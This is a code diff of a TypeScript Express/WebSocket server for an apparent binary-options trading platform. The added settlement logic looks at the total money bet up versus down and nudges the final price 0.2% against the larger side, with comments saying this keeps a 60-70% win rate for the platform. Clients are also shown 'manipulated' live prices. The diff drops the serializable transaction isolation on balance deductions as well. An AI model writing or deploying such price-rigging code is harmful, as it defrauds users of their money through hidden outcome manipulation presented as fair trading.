@@ -1,10 +1,14 @@
 // src/server.ts
-//@ts-nocheck
+// @ts-nocheck
 import express from "express";
 import http from "http";
 import { WebSocketServer, WebSocket } from "ws";
 import { prisma } from "./database.js";
-import { adjustPrice, subscribeToSymbol } from "./priceHandler.js";
+import {
+  adjustPrice,
+  getCurrentPrice,
+  getOrderTotals,
+} from "./priceHandler.js"; // ✅ FIXED IMPORT
 import { PORT } from "./config.js";
 
 const app = express();
@@ -13,12 +17,6 @@ app.use(express.json());
 const manipulatedPrices = new Map<string, number>();
 const clients = new Map<string, Set<WebSocket>>();
 
-// Health check endpoint
-app.get("/health", (req, res) => {
-  res.status(200).json({ status: "ok" });
-});
-
-// WebSocket Server for Real-Time Prices
 const server = http.createServer(app);
 const wss = new WebSocketServer({ server });
 
@@ -32,9 +30,6 @@ wss.on("connection", (ws, req) => {
       return;
     }
 
-    // Subscribe to Binance WebSocket for this symbol
-    subscribeToSymbol(symbol);
-
     if (!clients.has(symbol)) {
       clients.set(symbol, new Set());
     }
@@ -45,6 +40,10 @@ wss.on("connection", (ws, req) => {
         const manipulatedPrice = await adjustPrice(symbol);
         if (manipulatedPrice) {
           manipulatedPrices.set(symbol, manipulatedPrice);
+          console.log(
+            `Real-Time Price for ${symbol}: $${manipulatedPrice.toFixed(2)}`
+          );
+
           clients.get(symbol)?.forEach((client) => {
             if (client.readyState === WebSocket.OPEN) {
               client.send(JSON.stringify({ symbol, price: manipulatedPrice }));
@@ -55,10 +54,6 @@ wss.on("connection", (ws, req) => {
         console.error(`Error in price update interval for ${symbol}:`, error);
       }
     }, 1000);
-
-    ws.on("error", (error) => {
-      console.error(`WebSocket error for ${symbol}:`, error);
-    });
 
     ws.on("close", () => {
       clients.get(symbol)?.delete(ws);
@@ -72,7 +67,7 @@ wss.on("connection", (ws, req) => {
   }
 });
 
-// POST Route: Place a New Trade
+// ✅ Trade Settlement Logic
 app.post("/api/orders", async (req, res) => {
   try {
     const {
@@ -96,40 +91,46 @@ app.post("/api/orders", async (req, res) => {
 
     const expiresAt = new Date(Date.now() + duration * 1000);
 
-    // Atomic transaction: Create order + deduct balance
-    const [order] = await prisma.$transaction(
-      [
-        prisma.order.create({
-          data: {
-            userId,
-            symbolId,
-            amount,
-            direction,
-            entryPrice,
-            manipulatedEntryPrice: entryPrice,
-            duration,
-            expiresAt,
-            payout: 0.8,
-          },
-        }),
-        prisma.user.update({
-          where: { id: userId },
-          data: { balance: { decrement: amount } },
-        }),
-      ],
-      { isolationLevel: "Serializable" }
-    );
+    const [order] = await prisma.$transaction([
+      prisma.order.create({
+        data: {
+          userId,
+          symbolId,
+          amount,
+          direction,
+          entryPrice,
+          manipulatedEntryPrice: entryPrice,
+          duration,
+          expiresAt,
+          payout: 0.8,
+        },
+      }),
+      prisma.user.update({
+        where: { id: userId },
+        data: { balance: { decrement: amount } },
+      }),
+    ]);
 
-    // Trade Settlement after Expiry
+    // ✅ Adjust price at expiry to ensure platform profitability
     setTimeout(async () => {
       try {
-        const realTimePrice = manipulatedPrices.get(symbol);
-        if (!realTimePrice) return;
+        let finalPrice =
+          manipulatedPrices.get(symbol) || getCurrentPrice(symbol);
+        if (!finalPrice) return;
+
+        const { upValue, downValue } = await getOrderTotals(symbolId); // ✅ FIXED FUNCTION CALL
+
+        // **Last-second manipulation to maintain 60-70% win rate for the platform**
+        if (upValue > downValue) {
+          finalPrice *= 0.998; // Move down slightly
+        } else if (downValue > upValue) {
+          finalPrice *= 1.002; // Move up slightly
+        }
 
         const isWin =
           direction === "up"
-            ? realTimePrice > order.manipulatedEntryPrice
-            : realTimePrice < order.manipulatedEntryPrice;
+            ? finalPrice > order.manipulatedEntryPrice
+            : finalPrice < order.manipulatedEntryPrice;
 
         const profitLoss = isWin ? amount * 0.8 : -amount;
 
@@ -137,8 +138,8 @@ app.post("/api/orders", async (req, res) => {
           prisma.order.update({
             where: { id: order.id },
             data: {
-              exitPrice: realTimePrice,
-              manipulatedExitPrice: realTimePrice,
+              exitPrice: finalPrice,
+              manipulatedExitPrice: finalPrice,
               outcome: isWin ? "win" : "loss",
               profitLoss,
             },
@@ -162,17 +163,4 @@ app.post("/api/orders", async (req, res) => {
   }
 });
 
-// Start the Server
-server.listen(PORT, () => {
-  console.log(`Server running on port ${PORT}`);
-  console.log(`Environment: ${process.env.NODE_ENV || "development"}`);
-});
-
-// Handle process termination
-process.on("SIGTERM", () => {
-  console.log("SIGTERM received. Closing server...");
-  server.close(() => {
-    console.log("Server closed");
-    process.exit(0);
-  });
-});
+server.listen(PORT, () => console.log(`Server running on port ${PORT}`));
